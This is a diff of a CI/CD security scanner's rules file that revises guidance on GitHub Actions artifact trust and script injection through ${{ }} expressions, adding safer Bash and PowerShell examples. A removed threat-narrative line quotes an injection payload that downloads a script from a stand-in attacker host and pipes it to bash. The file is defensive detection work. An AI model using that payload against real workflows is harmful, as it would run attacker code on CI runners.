@@ -2023,18 +2023,7 @@ RULES: list[Rule] = [
             exclude=[r"^\s*#"],
         ),
         remediation=(
-            "If the consumer should run only after a successful producer, gate its owning job "
-            "or step on ``github.event.workflow_run.conclusion == 'success'``. Success is not "
-            "artifact provenance. For ``actions/download-artifact``, select the intended "
-            "artifact with ``name: <expected-artifact-name>`` and ``run-id: ${{ "
-            "github.event.workflow_run.id }}``; specify the intended ``repository: ${{ "
-            "github.repository }}``. For a different run in this repository, supply "
-            "``github-token: ${{ secrets.GITHUB_TOKEN }}`` with ``actions: read``. "
-            "For another repository, use a credential authorized to read artifacts there; "
-            "the workflow GITHUB_TOKEN is limited to its own repository. "
-            "Verify the expected producer workflow/event/ref and validate content and "
-            "provenance before use. The default artifact name, repository, and token binding "
-            "need confirmation for this consumer."
+            "Gate the consumer on the upstream conclusion, but do not treat a successful run as a trust check. The upstream workflow may process pull-request code, and its artifacts may contain attacker-controlled data. For a parse-only consumer, use a complete job with read-only artifact access and bind the download to the triggering run:\n\njobs:\n  inspect-report:\n    if: github.event.workflow_run.conclusion == 'success'\n    runs-on: ubuntu-latest\n    permissions:\n      actions: read\n    steps:\n      - uses: actions/download-artifact@<pinned-sha>\n        with:\n          name: report\n          github-token: ${{ secrets.GITHUB_TOKEN }}\n          repository: ${{ github.repository }}\n          run-id: ${{ github.event.workflow_run.id }}\n          path: ./untrusted/\n      - name: Parse the expected report as data\n        shell: bash\n        run: jq -e '.summary | strings' ./untrusted/report.json > /dev/null\n\nDo not check out or execute `github.event.workflow_run.head_sha`, a branch name, or downloaded artifacts in this consumer. The download token, repository and run ID select the artifact source; they do not verify its producer or contents. Validate the expected producer, paths, format and allowed operations. Review the event actor, permissions and secrets separately. If a comment is needed, verify the associated pull request and post static text that does not reflect artifact content. Success is not artifact provenance. This example selects another run in the same repository. For another repository, use a credential authorized to read artifacts there; the workflow GITHUB_TOKEN is limited to its own repository."
         ),
         reference="https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/",
         test_positive=[
@@ -2063,9 +2052,7 @@ RULES: list[Rule] = [
         platform=Platform.GITHUB,
         owasp_cicd="CICD-SEC-4",
         description=(
-            "User-controlled value injected directly into a run: block via ${{ }} expression. "
-            "Attacker can craft PR titles, issue bodies, branch names, or commit messages "
-            "containing shell commands that execute in the runner context."
+            "A GitHub context expression that may contain user-influenceable data is interpolated directly into a `run:` block's generated script. For contexts an untrusted actor can influence on the triggering event, shell syntax in the value can alter the script before execution. Review the exact event, field, configured shell and downstream use: the interpolation alone does not prove an external actor can reach the step, that a command executes, or that it can access credentials or permissions."
         ),
         # Structural form scopes the query to ``run:`` keys
         # directly — the path filter does the structural job that
@@ -2076,16 +2063,7 @@ RULES: list[Rule] = [
         # interpolation, by design.
         pattern=_EventAwareScriptInjectionPattern(),
         remediation=(
-            "Pass the value through an environment variable so the "
-            "${{ }} interpolation expands into the runner's env map, "
-            "not into the generated step script:\n"
-            "env:\n  TITLE: ${{ github.event.pull_request.title }}\n"
-            'run: echo "$TITLE"\n'
-            "For values passed to downstream tools that interpret their "
-            "input (git, url construction, sqlite), validate against an "
-            "allowlist after the env-var step. Run "
-            "`taintly --guide SEC4-GH-004` for the full "
-            "injection-vs-downstream-sanitization model."
+            "First confirm the context value is untrusted for this event and that the step needs it. When it is data for a shell command, move the expression out of shell source and read the step environment using the configured shell. For Bash, quote the variable as a single argument; for PowerShell, use `$env:TITLE` as data:\n\n  - name: Print title (Bash)\n    shell: bash\n    env:\n      TITLE: ${{ github.event.pull_request.title }}\n    run: printf '%s\\n' \"$TITLE\"\n\n  - name: Print title (PowerShell)\n    shell: pwsh\n    env:\n      TITLE: ${{ github.event.pull_request.title }}\n    run: Write-Output $env:TITLE\n\nThis keeps the expression out of the generated script; it does not make later `eval`, `Invoke-Expression`, `bash -c`, generated code, or a downstream parser safe. Apply the consumer's proper encoding or validation only when its input format requires it. Do not treat environment routing as a universal sanitizer or isolation boundary. Run `taintly --guide SEC4-GH-004` for the full injection-vs-downstream-sanitization model."
         ),
         reference="https://securitylab.github.com/resources/github-actions-untrusted-input/",
         test_positive=[
@@ -2105,13 +2083,7 @@ RULES: list[Rule] = [
         ],
         stride=["T", "E"],
         threat_narrative=(
-            "An attacker can craft a PR title, issue body, or branch name containing shell "
-            "metacharacters — such as `'; curl attacker.com/c2.sh | bash #` — that execute as "
-            "commands when the value is interpolated into a run: block. "
-            "If the owning event and job/step conditions permit execution, injected commands "
-            "may run with the authority available to that consumer. Requested token scopes, "
-            "credential bindings and provider settings need separate verification; this source "
-            "pattern alone establishes neither repository-write authority nor secret availability."
+            "Direct interpolation creates a shell-script injection candidate when the referenced context is untrusted and an actor can supply its value on this event. Whether that condition holds, what the configured shell parses, and what credentials or permissions are available require event- and job-specific review."
         ),
         incidents=["Ultralytics (Dec 2024)", "Langflow (2024)"],
         confidence="high",
